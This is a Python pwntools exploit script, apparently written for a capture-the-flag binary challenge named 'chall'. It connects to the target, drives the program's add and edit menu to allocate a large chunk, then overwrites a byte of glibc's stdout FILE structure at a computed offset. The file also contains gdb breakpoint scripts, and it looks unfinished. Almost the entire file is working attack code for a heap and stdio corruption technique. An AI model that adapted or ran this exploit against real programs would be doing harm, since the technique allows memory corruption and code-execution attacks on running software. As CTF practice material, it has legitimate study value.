#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11106 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 11110)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv,aslr=0, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
dir /root/Desktop/libc/glibc-2.27/libio/
continue
b *edit+152
# b *add+77
c
c
c

# b *readint+42
# c
# b *read+15
# c
# c

b *menu+30
c
# b *puts+202
# c
# b *__GI__IO_do_write+173
# c

# b *readint+42
# c
# b *read+15
# c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def add():
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(0x200000))
    io.sendafter(": ","a"*20)

def edit(start,msg,noafter=1):
    if noafter:
        io.sendlineafter("> ","2")
    else:
        io.sendline("2")
    if noafter:
        io.sendlineafter(": ",str(start))
    else:
        io.sendline(str(start))
    if noafter:
        io.sendafter(": ",msg)
    else:
        io.send(msg)


libc = ELF("./libc-2.29.so")

idx_stdout  = libc.sym["_IO_2_1_stdout_"]
idx_stdin   = libc.sym["_IO_2_1_stdin_"]
# x/40gx &_IO_2_1_stdin_
# x/40gx &_IO_2_1_stdout_
add()

# x/30gx &_IO_2_1_stdout_
# b *menu+30
# b *puts+202 (_IO_new_file_xsputn) 0x38
# b *__GI__IO_file_xsputn+290 (_IO_new_file_overflow) 0x18
# b *__GI__IO_file_xsputn+446
# b *__GI__IO_file_overflow+262
# b *__GI__IO_do_write+173 (_IO_new_file_write) 0x78
edit(0x204000-0x10+idx_stdout,'\x18')

# edit(0x204000-0x10+idx_stdout+32,'\x08',0)

io.interactive()
